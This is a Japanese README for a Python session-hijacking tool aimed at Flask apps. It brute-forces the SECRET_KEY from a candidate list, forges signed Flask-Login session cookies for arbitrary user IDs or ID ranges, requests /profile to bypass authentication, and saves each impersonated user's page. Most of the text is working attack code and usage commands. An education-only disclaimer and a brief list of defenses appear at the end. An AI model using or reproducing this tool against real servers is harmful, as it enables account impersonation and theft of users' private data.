# セッションハイジャックツール

指定したWEBサーバーに対してセッションハイジャックを実行し、SECRET_KEYを辞書攻撃で見つけるPythonツールです。

## 注意事項

⚠️ **このツールは教育目的および許可された環境でのみ使用してください。**
- 許可されていないサーバーに対する攻撃は違法です
- 自分のサーバーやCTF（Capture The Flag）などの許可された環境でのみ使用してください

## インストール

```bash
pip install -r requirements.txt
```

## 主な機能

### 1. SECRET_KEYの辞書攻撃
- デフォルトのSECRET_KEY候補リストを使用した自動攻撃
- 実際のHTTPリクエストでSECRET_KEYを検証
- 各候補を順次試行し、正しいSECRET_KEYを特定

### 2. セッションデータの偽造
- `_user_id`, `_fresh`, `_id`を含む標準的なFlask-Loginセッションデータ構造の生成
- 指定したユーザーIDでのセッション偽造
- Flaskの`SecureCookieSessionInterface`を使用した署名付きセッションクッキーの生成

### 3. プロフィールページへのアクセス
- 偽造したセッションクッキーを使用して`/profile`エンドポイントにアクセス
- 認証バイパスの成功/失敗を判定
- 成功した場合、HTMLをファイルに保存

### 4. 複数ユーザーIDのサポート
- 単一のユーザーIDまたは範囲（例: `1-5`）を指定可能
- 各ユーザーIDに対して個別にセッションハイジャックを実行
- 各ユーザーIDごとにHTMLファイルを保存

### 5. 簡潔なログ出力
- 各ステップの進行状況を表示
- 生成されたセッションクッキーの表示
- アクセス結果の表示

## 使用方法

### 基本的な使用方法

```bash
python 001session_hijack.py -u http://localhost:5000
```

### 特定のユーザーIDを指定

```bash
python 001session_hijack.py -u http://localhost:5000 -i 2
```

### ユーザーIDの範囲を指定

```bash
python 001session_hijack.py -u http://localhost:5000 -i 1-5
```

## オプション

- `-u, --url`: ターゲットURL（必須）
- `-i`: 攻撃対象のユーザーID（オプション、デフォルト: 1）。範囲指定可（例: 1-5）

## 動作原理

1. **コマンドライン引数の解析**: `argparse`を使用してターゲットURLとユーザーIDを取得
2. **ユーザーIDの範囲解析**: `-i`オプションで指定された範囲（例: `1-5`）をパースしてリストに変換
3. **SECRET_KEYの辞書攻撃**: デフォルトのSECRET_KEY候補リストを順次試行し、実際のHTTPリクエストで検証
4. **セッションデータの偽造**: `_user_id`, `_fresh`, `_id`を含む偽造セッションデータを生成
5. **Flaskセッションクッキーの生成**: `SecureCookieSessionInterface`を使用して署名付きのセッションクッキーを生成
6. **プロフィールページへのアクセス**: 偽造したセッションクッキーを使用して`/profile`エンドポイントにアクセス
7. **結果の判定**: レスポンスのステータスコードと内容を確認し、認証バイパスの成功/失敗を判定
8. **HTMLの保存**: 成功した場合、プロフィールページのHTMLを`profile_page_user_{id}.html`として保存

## コード解説

### 1. コマンドライン引数の解析（105-120行目）

```python
def main():
    parser = argparse.ArgumentParser(
        description='WEBサーバーに対するセッションハイジャックツール',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用例:
  python 001session_hijack.py -u http://localhost:5000
  python 001session_hijack.py --url http://example.com:8080
  python 001session_hijack.py -u http://localhost:5000 -i 2
  python 001session_hijack.py -u http://localhost:5000 -i 1-2
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='ターゲットURL（必須）')
    parser.add_argument('-i', dest='user_id', default='1', 
                       help='攻撃対象のユーザーID（デフォルト: 1）。範囲指定可（例: 1-2）')
```

`argparse`を使用してコマンドライン引数を解析します。`-u`（または`--url`）は必須で、`-i`でユーザーIDを指定できます。

### 2. ユーザーIDの範囲解析（6-15行目）

```python
def parse_user_ids(user_id_str):
    """ユーザーID文字列をパースしてリストを返す"""
    if '-' in user_id_str:
        try:
            start, end = map(int, user_id_str.split('-', 1))
            return [str(i) for i in range(min(start, end), max(start, end) + 1)]
        except ValueError:
            print(f"[!] 警告: 無効な範囲指定 '{user_id_str}'。単一IDとして扱います。")
            return [user_id_str]
    return [user_id_str]
```

`-i`オプションで指定された文字列を解析します。`1-5`のような範囲指定の場合は、`['1', '2', '3', '4', '5']`のようなリストに変換します。無効な範囲指定（例: `abc-def`）の場合は、警告を表示して単一IDとして扱います。

### 3. SECRET_KEYの辞書攻撃（55-71行目）

```python
def discover_secret_key(secret_keys, target_url, test_user_id):
    """SECRET_KEYを総当たりで特定"""
    print("\n[*] 試行するSECRET_KEY候補:")
    for i, key in enumerate(secret_keys, 1):
        print(f"  {i}. {key}")
    
    for secret_key in secret_keys:
        print(f"\n[*] SECRET_KEYを試行: {secret_key}")
        serializer = test_secret_key(secret_key, target_url, test_user_id)
        if serializer:
            print(f"  [OK] SECRET_KEY '{secret_key}' が正しいです！")
            return secret_key, serializer
        print(f"  [NG] SECRET_KEY '{secret_key}' では失敗")
    
    print(f"\n[!] 警告: すべてのSECRET_KEYで失敗しました")
    print(f"[!] デフォルトのSECRET_KEY '{secret_keys[0]}' を使用します")
    return secret_keys[0], create_serializer(secret_keys[0])
```

各SECRET_KEY候補に対して、`test_secret_key`関数で実際のHTTPリクエストを送信して検証します。成功した場合、そのSECRET_KEYとシリアライザーを返します。すべて失敗した場合は、デフォルトのSECRET_KEYを使用します。

### 4. セッションデータの偽造（25-27行目）

```python
def create_session_data(user_id):
    """偽造するセッションデータを作成"""
    return {"_user_id": user_id, "_fresh": True, "_id": user_id}
```

Flaskの標準的なセッションデータ構造に合わせて、`_user_id`、`_fresh`、`_id`を含む辞書を作成します。これがセッションクッキーにエンコードされます。

### 5. Flaskセッションクッキーの生成（18-22行目、47-52行目）

```python
def create_serializer(secret_key):
    """Flaskアプリケーションを作成してセッションシリアライザーを取得"""
    app = Flask(__name__)
    app.config['SECRET_KEY'] = secret_key
    return app.session_interface.get_signing_serializer(app)

def test_secret_key(secret_key, target_url, test_user_id):
    """SECRET_KEYをテストして有効性を確認"""
    serializer = create_serializer(secret_key)
    cookie = serializer.dumps(create_session_data(test_user_id))
    response = make_request_with_cookie(cookie, target_url)
    return serializer if is_attack_successful(response) else None
```

Flaskの`SecureCookieSessionInterface`を使用して、セッションデータを署名付きのセッションクッキーにエンコードします。`test_secret_key`関数では、生成したクッキーで実際にリクエストを送信し、成功判定を行います。

### 6. プロフィールページへのアクセス（40-44行目、83行目）

```python
def make_request_with_cookie(cookie, target_url):
    """セッションクッキーでリクエストを送信"""
    session = requests.Session()
    session.cookies.set('session', cookie)
    return session.get(f'{target_url}/profile', allow_redirects=False)

# 使用例
response = make_request_with_cookie(cookie, target_url)
```

共通関数`make_request_with_cookie`を使用して、偽造したセッションクッキーでプロフィールページにアクセスします。`allow_redirects=False`にすることで、リダイレクトの挙動を確認できます。

### 7. 成功判定とHTMLの保存（30-37行目、92-102行目）

```python
def is_attack_successful(response):
    """レスポンスから攻撃成功を判定"""
    if response.status_code == 200:
        text = response.text
        return not ('ログイン' in text and 'username' in text.lower() and '<title>ログイン' in text)
    elif response.status_code == 302:
        return '/login' not in response.headers.get('Location', '').lower()
    return False

# 使用例
if is_attack_successful(response):
    print("[+] 攻撃成功: 認証をバイパスしました")
    output_filename = f"profile_page_user_{user_id}.html"
    with open(output_filename, 'w', encoding='utf-8') as f:
        f.write(response.text)
```

`is_attack_successful`関数で、レスポンスのステータスコードと内容を確認して認証バイパスの成功/失敗を判定します。ステータスコード200でログインページでない場合、または302で`/login`以外へのリダイレクトの場合、成功と判定します。成功した場合、HTMLを`profile_page_user_{id}.html`として保存します。

## 対応フレームワーク

- Flask（`SecureCookieSessionInterface`を使用）

## デフォルトのSECRET_KEY候補

コード内で定義されているデフォルトのSECRET_KEY候補リスト：

```python
SECRET_KEYS = [
    "secret",
    "secret-key",
    "testkey",
    "ecre-key",
    "your-secret-key-change-in-production",
    "secret-keys",
]
```

これらの候補を順次試行し、実際のHTTPリクエストで検証します。

## SECRET_KEY発見後のアクセスプロセス（体系的説明）

SECRET_KEYを特定した後、どのようにして保護されたリソースにアクセスしているかを、技術的な詳細を含めて体系的に説明します。

### 全体フロー

```
SECRET_KEY発見
    ↓
Flaskアプリケーションの設定
    ↓
セッションシリアライザーの取得
    ↓
偽造セッションデータの作成
    ↓
セッションクッキーの生成（署名付き）
    ↓
HTTPリクエストの送信（クッキー付き）
    ↓
サーバー側での検証と認証バイパス
    ↓
保護されたリソースへのアクセス成功
```

### ステップ1: Flaskアプリケーションの設定（18-22行目）

```python
def create_serializer(secret_key):
    """Flaskアプリケーションを作成してセッションシリアライザーを取得"""
    app = Flask(__name__)
    app.config['SECRET_KEY'] = secret_key
    return app.session_interface.get_signing_serializer(app)
```

**説明**:
- 発見した`SECRET_KEY`を使用してFlaskアプリケーションインスタンスを作成
- `app.config['SECRET_KEY']`に設定することで、セッションクッキーの署名・検証に使用される
- `get_signing_serializer(app)`で、セッションデータをシリアライズ（エンコード）・デシリアライズ（デコード）するためのシリアライザーを取得

**技術的詳細**:
- Flaskのセッションクッキーは`itsdangerous`ライブラリを使用して署名される
- シリアライザーは`SECRET_KEY`を使用してHMAC署名を生成し、改ざんを防ぐ

### ステップ2: 偽造セッションデータの作成（25-27行目）

```python
def create_session_data(user_id):
    """偽造するセッションデータを作成"""
    return {"_user_id": user_id, "_fresh": True, "_id": user_id}
```

**説明**:
- Flaskのセッションデータ構造に合わせた辞書を作成
- `_user_id`: なりすましたいユーザーのID（文字列形式）
- `_fresh`: セッションが「新鮮」であることを示すフラグ（通常は`True`）
- `_id`: セッションID（この場合、ユーザーIDと同じ）

**なぜこの構造なのか**:
- Flask-Loginなどの認証拡張機能が使用する標準的なセッションデータ構造
- サーバー側の認証ミドルウェアが`_user_id`を確認してユーザーを識別する

### ステップ3: セッションクッキーの生成（80行目）

```python
cookie = serializer.dumps(create_session_data(user_id))
```

**説明**:
- `serializer.dumps()`メソッドで、セッションデータを署名付きのセッションクッキー文字列に変換
- この処理は以下のステップで実行される：
  1. **JSONエンコード**: セッションデータをJSON形式に変換
  2. **Base64エンコード**: JSON文字列をBase64エンコード
  3. **HMAC署名の生成**: `SECRET_KEY`を使用してHMAC-SHA1署名を生成
  4. **結合**: `{base64_data}.{timestamp}.{signature}`の形式で結合

**生成されるクッキーの形式**:
```
eyJfdXNlcl9pZCI6IjEiLCJfZnJlc2giOnRydWUsIl9pZCI6IjEifQ.aS66_g.kPRYHYEhk4vpdOw-XJdsiPsZY34
│─────────── Base64エンコードされたセッションデータ ───────────││timestamp││─── HMAC署名 ───│
```

### ステップ4: HTTPリクエストの準備（40-44行目、83行目）

```python
def make_request_with_cookie(cookie, target_url):
    """セッションクッキーでリクエストを送信"""
    session = requests.Session()
    session.cookies.set('session', cookie)
    return session.get(f'{target_url}/profile', allow_redirects=False)

# 使用例
response = make_request_with_cookie(cookie, target_url)
```

**説明**:
- `requests.Session()`でHTTPセッションオブジェクトを作成
- `session.cookies.set('session', fake_cookie)`で、生成した偽造セッションクッキーを設定
- これにより、このセッションで送信されるすべてのHTTPリクエストに`Cookie: session={fake_cookie}`ヘッダーが自動的に付与される

**HTTPリクエストヘッダーの例**:
```
GET /profile HTTP/1.1
Host: localhost:5000
Cookie: session=eyJfdXNlcl9pZCI6IjEiLCJfZnJlc2giOnRydWUsIl9pZCI6IjEifQ.aS66_g.kPRYHYEhk4vpdOw-XJdsiPsZY34
```

### ステップ5: 保護されたエンドポイントへのアクセス（83行目）

```python
response = make_request_with_cookie(cookie, target_url)
```

**説明**:
- 偽造セッションクッキーを含むHTTPリクエストを`/profile`エンドポイントに送信
- `allow_redirects=False`により、リダイレクトを自動的に追跡せず、最初のレスポンスを取得
- これにより、認証失敗時のリダイレクト挙動を確認できる

### ステップ6: サーバー側での検証プロセス

サーバー側（Flaskアプリケーション）では、以下の処理が実行されます：

1. **クッキーの受信**: HTTPリクエストから`session`クッキーを取得
2. **署名の検証**: 
   - サーバーの`SECRET_KEY`を使用してHMAC署名を再計算
   - クッキーに含まれる署名と比較
   - 一致しない場合、クッキーは無効と判定され、認証失敗
3. **セッションデータの復号**:
   - 署名が有効な場合、Base64デコードとJSONデコードを実行
   - セッションデータ（`_user_id`など）を取得
4. **認証チェック**:
   - `_user_id`が存在するか確認
   - 存在する場合、そのユーザーとして認証済みとみなす
   - 保護されたリソースへのアクセスを許可

**重要なポイント**:
- クッキーの署名が正しい場合、サーバーはクッキーの内容を信頼する
- `SECRET_KEY`が正しければ、攻撃者は任意の`_user_id`を含むセッションクッキーを生成できる
- これがセッションハイジャックの根本的な脆弱性

### ステップ7: レスポンスの検証（30-37行目、92-102行目）

```python
def is_attack_successful(response):
    """レスポンスから攻撃成功を判定"""
    if response.status_code == 200:
        text = response.text
        return not ('ログイン' in text and 'username' in text.lower() and '<title>ログイン' in text)
    elif response.status_code == 302:
        return '/login' not in response.headers.get('Location', '').lower()
    return False

# 使用例
if is_attack_successful(response):
    print("[+] 攻撃成功: 認証をバイパスしました")
    # HTMLを保存
```

**説明**:
- **ステータスコード200**: ログインページでない場合、成功と判定
  - ログインページの判定は、`'ログイン'`、`'username'`、`'<title>ログイン'`の3つすべてが含まれる場合
- **ステータスコード302**: `/login`以外へのリダイレクトの場合、成功と判定
- **リダイレクト処理（86-90行目）**: `/login`へのリダイレクトの場合は、リダイレクト先にアクセスして最終的なレスポンスを取得

### ステップ8: 成功時のHTML保存（94-100行目）

```python
if is_attack_successful(response):
    print("[+] 攻撃成功: 認証をバイパスしました")
    output_filename = f"profile_page_user_{user_id}.html"
    try:
        with open(output_filename, 'w', encoding='utf-8') as f:
            f.write(response.text)
        print(f"[*] HTML情報を {output_filename} に出力しました")
    except Exception as e:
        print(f"[!] HTML情報の出力エラー: {e}")
```

**説明**:
- 攻撃が成功した場合、取得したHTMLをファイルに保存
- ファイル名は`profile_page_user_{user_id}.html`の形式
- これにより、なりすましたユーザーの情報を後で確認できる

### セキュリティ上の重要なポイント

1. **SECRET_KEYの重要性**:
   - `SECRET_KEY`が漏洩または推測可能な場合、攻撃者は任意のユーザーになりすませる
   - 強力で予測不可能な`SECRET_KEY`を使用することが重要

2. **セッションクッキーの構造**:
   - Flaskのセッションクッキーは署名付きだが、暗号化されていない
   - クッキーの内容（Base64部分）はデコード可能で、`_user_id`などの情報が読み取れる

3. **認証バイパスのメカニズム**:
   - 正しい`SECRET_KEY`を使用して署名されたクッキーは、サーバーによって有効と判定される
   - サーバーは署名の検証のみを行い、クッキーの内容（`_user_id`）が実際のログインセッションから来たものかは検証しない

4. **防御策**:
   - 強力でランダムな`SECRET_KEY`を使用
   - セッションクッキーに追加の検証（IPアドレス、User-Agentなど）を実装
   - セッションIDをランダムで予測不可能な値にする
   - セッションタイムアウトを適切に設定

## ライセンス

教育目的のみ。使用は自己責任でお願いします。

